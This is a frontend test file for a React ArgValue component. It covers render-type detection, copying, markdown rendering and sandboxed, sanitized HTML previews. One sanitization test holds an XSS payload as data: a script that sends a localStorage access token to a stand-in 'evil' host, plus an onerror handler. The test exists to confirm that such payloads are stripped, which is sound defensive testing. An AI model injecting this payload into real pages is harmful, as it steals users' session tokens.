// Copyright Solace Corporation
//
// Use of this software is governed by the Business Source License (BUSL-1.1)
// included in the LICENSE file.

import { fireEvent, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { renderWithProviders } from "@/testing/helpers/renderWithProviders";

import { ArgValue, isRichArgType, resolveArgRenderType } from "./ArgValue";

const copyMock = vi.fn(async (_text: string) => true);
vi.mock("@/utils/clipboard", () => ({
    copyToClipboard: (text: string) => copyMock(text),
}));

afterEach(() => {
    copyMock.mockClear();
});

function renderArg(props: { value: string; contentType?: string; tooltip?: string; showCopy?: boolean }) {
    return renderWithProviders(<ArgValue {...props} />);
}

describe("resolveArgRenderType", () => {
    it("honors a recognised backend hint", () => {
        expect(resolveArgRenderType("anything", "html")).toBe("html");
        expect(resolveArgRenderType("anything", "JSON")).toBe("json");
        expect(resolveArgRenderType("anything", "markdown")).toBe("markdown");
        expect(resolveArgRenderType("<b>x</b>", "text")).toBe("text");
    });

    it("sniffs when the hint is absent or unknown", () => {
        expect(resolveArgRenderType("<h1>Title</h1>")).toBe("html");
        expect(resolveArgRenderType('{"a": 1}')).toBe("json");
        expect(resolveArgRenderType("[1, 2, 3]")).toBe("json");
        expect(resolveArgRenderType("just prose")).toBe("text");
        expect(resolveArgRenderType("{not json}")).toBe("text");
        expect(resolveArgRenderType("42")).toBe("text");
        expect(resolveArgRenderType("<h1>x</h1>", "bogus")).toBe("html");
    });
});

describe("isRichArgType", () => {
    it("treats html/json/yaml/markdown as rich and text as not", () => {
        expect(["html", "json", "yaml", "markdown"].every(isRichArgType)).toBe(true);
        expect(isRichArgType("text")).toBe(false);
    });
});

describe("ArgValue rendering", () => {
    it("renders a plain value in a monospace field with a copy button", () => {
        renderArg({ value: "plain value", tooltip: "why" });
        const el = screen.getByText("plain value");
        expect(el.tagName).toBe("DIV");
        expect(el.className).toContain("font-mono");
        expect(el.getAttribute("title")).toBe("why");
        expect(screen.getByRole("button", { name: /Copy/i })).toBeInTheDocument();
    });

    it("hides the copy button when showCopy is false", () => {
        renderArg({ value: "plain value", showCopy: false });
        expect(screen.queryByRole("button", { name: /Copy/i })).toBeNull();
    });

    it("copies the value when the copy button is clicked", async () => {
        renderArg({ value: "copy me" });
        fireEvent.click(screen.getByRole("button", { name: /Copy/i }));
        await waitFor(() => expect(copyMock).toHaveBeenCalledWith("copy me"));
    });

    it("renders html as a sanitized iframe preview, not raw tags", () => {
        const { container } = renderArg({ value: "<h1>Heading</h1>", contentType: "html" });
        const iframe = container.querySelector("iframe");
        expect(iframe).not.toBeNull();
        expect(iframe?.getAttribute("srcdoc") ?? "").toContain("<h1>Heading</h1>");
        expect(container.textContent).not.toContain("Heading");
    });

    it("locks the html preview sandbox — no script execution, no origin access", () => {
        const { container } = renderArg({ value: "<p>x</p>", contentType: "html" });
        const sandbox = container.querySelector("iframe")?.getAttribute("sandbox");
        expect(sandbox).toBe("");
    });

    it("strips scripts and event handlers from html values before rendering", () => {
        const payload = `<h1>Hi</h1><script>fetch('https://evil/?t='+localStorage.getItem('access_token'))</script><img src=x onerror="alert(1)">`;
        const { container } = renderArg({ value: payload, contentType: "html" });
        const srcdoc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
        expect(srcdoc).toContain("<h1>Hi</h1>");
        expect(srcdoc).not.toContain("<script");
        expect(srcdoc).not.toContain("onerror");
        expect(srcdoc).not.toContain("localStorage");
    });

    it("renders markdown content through the markdown renderer", () => {
        const { container } = renderArg({ value: "# Title\n\n- bullet", contentType: "markdown" });
        expect(container.querySelector("h1")?.textContent).toContain("Title");
        expect(container.querySelector("iframe")).toBeNull();
    });

    it("falls back to the monospace block when a rich renderer reports an error", async () => {
        const { container } = renderArg({ value: "{definitely: not json", contentType: "json" });
        await waitFor(() => {
            const fallback = container.querySelector("div.max-h-40.font-mono");
            expect(fallback?.textContent).toBe("{definitely: not json");
        });
        expect(container.querySelector("iframe")).toBeNull();
    });
});
